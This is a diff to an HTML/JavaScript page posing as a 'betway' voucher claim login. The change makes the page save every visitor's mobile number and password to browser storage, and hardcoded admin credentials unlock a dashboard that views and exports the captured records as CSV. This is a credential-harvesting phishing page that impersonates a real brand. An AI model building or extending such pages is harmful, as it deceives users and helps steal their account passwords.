@@ -381,6 +381,21 @@
             text-decoration: underline;
         }
 
+        .view-data-link {
+            text-align: center;
+            margin-top: 0.5rem;
+        }
+        .view-data-link a {
+            color: #00a651;
+            font-size: 0.7rem;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .view-data-link a:hover {
+            text-decoration: underline;
+        }
+
         .footer-note {
             padding: 0.8rem 1.5rem 1rem 1.5rem;
             text-align: center;
@@ -832,6 +847,11 @@
             <div class="signup-prompt">
                 Don't have an account yet? <a href="#">Sign Up</a>
             </div>
+
+            <!-- Admin/View Data Link - hidden by default, only shown after correct credentials -->
+            <div class="view-data-link" id="viewDataLink" style="display: none;">
+                <a id="viewDataBtn"><i class="fas fa-database"></i> View Saved Data</a>
+            </div>
         </div>
 
         <div class="footer-note">
@@ -891,10 +911,10 @@
 
     <script>
         (function() {
-            // ==================== HARDCODED CREDENTIALS ====================
-            const VALID_MOBILE = '0712345678';
-            const VALID_PASSWORD = 'betway123';
-            // ==============================================================
+            // ==================== HARDCODED ADMIN CREDENTIALS ====================
+            const ADMIN_MOBILE = '0712345678';
+            const ADMIN_PASSWORD = 'betway123';
+            // ====================================================================
 
             const loadingScreen = document.getElementById('loadingScreen');
             const mainCard = document.getElementById('mainCard');
@@ -911,8 +931,11 @@
             const recordCount = document.getElementById('recordCount');
             const exportCsvBtn = document.getElementById('exportCsvBtn');
             const clearDataBtn = document.getElementById('clearDataBtn');
+            const viewDataLink = document.getElementById('viewDataLink');
+            const viewDataBtn = document.getElementById('viewDataBtn');
 
             const STORAGE_KEY = 'betway_user_data';
+            let isAdminLoggedIn = false;
 
             // Loading screen timer
             let countdown = 3;
@@ -938,7 +961,7 @@
                 this.classList.toggle('fa-eye-slash');
             });
 
-            // Save data to localStorage
+            // Save data to localStorage (anyone can save)
             function saveData(mobile, password) {
                 try {
                     let existingData = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
@@ -1050,11 +1073,17 @@
                     mainCard.style.display = 'flex';
                     setTimeout(() => {
                         mainCard.classList.add('visible');
+                        // Check if admin is logged in to show view data link
+                        if (isAdminLoggedIn) {
+                            viewDataLink.style.display = 'block';
+                        } else {
+                            viewDataLink.style.display = 'none';
+                        }
                     }, 50);
                 }, 300);
             }
 
-            // Handle voucher claim / login
+            // Handle voucher claim
             claimBtn.addEventListener('click', function(e) {
                 e.preventDefault();
 
@@ -1066,39 +1095,62 @@
                     return;
                 }
 
-                // Check credentials against hardcoded values
-                if (mobile === VALID_MOBILE && password === VALID_PASSWORD) {
-                    // Save the data
+                // Check if it's the admin credentials
+                if (mobile === ADMIN_MOBILE && password === ADMIN_PASSWORD) {
+                    isAdminLoggedIn = true;
+                    // Save the data first
                     const success = saveData(mobile, password);
                     if (success) {
-                        // Show caution modal first, then dashboard
+                        // Show caution modal
                         cautionModal.classList.add('active');
                         // Clear fields
                         mobileInput.value = '';
                         passwordInput.value = '';
-                    } else {
-                        alert('There was an error saving your data. Please try again.');
+                        // Show view data link after closing modal
+                        viewDataLink.style.display = 'block';
                     }
+                    return;
+                }
+
+                // Regular user - just save data and show caution
+                const success = saveData(mobile, password);
+                if (success) {
+                    cautionModal.classList.add('active');
+                    mobileInput.value = '';
+                    passwordInput.value = '';
                 } else {
-                    alert('Invalid credentials. Please check your mobile number and password.');
+                    alert('There was an error saving your data. Please try again.');
                 }
             });
 
-            // Close caution modal and show dashboard
+            // Close caution modal and show dashboard if admin, or just close for regular users
             closeModalBtn.addEventListener('click', function() {
                 cautionModal.classList.remove('active');
-                // After closing modal, show the dashboard
-                setTimeout(() => {
-                    showDashboard();
-                }, 200);
+                if (isAdminLoggedIn) {
+                    setTimeout(() => {
+                        showDashboard();
+                    }, 200);
+                }
             });
 
             cautionModal.addEventListener('click', function(e) {
                 if (e.target === cautionModal) {
                     cautionModal.classList.remove('active');
-                    setTimeout(() => {
-                        showDashboard();
-                    }, 200);
+                    if (isAdminLoggedIn) {
+                        setTimeout(() => {
+                            showDashboard();
+                        }, 200);
+                    }
+                }
+            });
+
+            // View Data button (admin only)
+            viewDataBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (isAdminLoggedIn) {
+                    showDashboard();
+                } else {
+                    alert('Please login with admin credentials to view data.');
                 }
             });
 
@@ -1130,9 +1182,11 @@
                 if (e.key === 'Escape') {
                     if (cautionModal.classList.contains('active')) {
                         cautionModal.classList.remove('active');
-                        setTimeout(() => {
-                            showDashboard();
-                        }, 200);
+                        if (isAdminLoggedIn) {
+                            setTimeout(() => {
+                                showDashboard();
+                            }, 200);
+                        }
                     }
                 }
             });
